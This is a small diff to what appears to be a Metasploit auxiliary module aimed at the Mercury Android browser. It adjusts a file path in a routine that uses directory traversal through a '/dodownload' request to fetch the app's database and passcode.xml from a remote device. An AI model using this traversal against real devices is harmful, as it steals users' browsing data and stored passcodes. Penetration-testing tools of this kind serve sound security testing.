@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
   def get_xml_files(rhost)
     base_dir = '../../../../data/data/com.ilegendsoft.mercury'
 
-    ['mercury_database.db', '/shared_prefs/passcode.xml'].each do |item|
+    ['/mercury_database.db', '/shared_prefs/passcode.xml'].each do |item|
       opts = {
         'method' => 'GET',
         'uri' => '/dodownload',
